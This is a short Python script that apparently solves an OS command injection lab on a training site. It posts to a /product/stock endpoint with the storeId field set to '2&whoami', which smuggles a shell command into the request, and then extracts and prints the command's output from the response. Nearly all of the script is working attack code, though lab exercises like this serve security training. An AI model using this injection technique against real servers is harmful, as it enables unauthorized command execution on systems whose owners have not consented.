import sys
import re
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def run_whoami_command(url):

    print()
    print(f"[*] Sending request as POST {url}/product/stock")
    print("[*] Using payload productId=1&storeId=1%26whoami")
    print()

    url = url + "/product/stock"

    data = {
        "productId": "1",
        "storeId": "2&whoami"
    }

    response = requests.post(url, data=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print(f"Request Body: {response.request.body}")
    print()

    response_output = response.text.split()

    for each_string in response_output:
        if not bool(re.search(r'\d', each_string)):
            print(f"Output of whoami command: {each_string}")
            print()
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        run_whoami_command(url)
        verify_if_lab_solved(url)
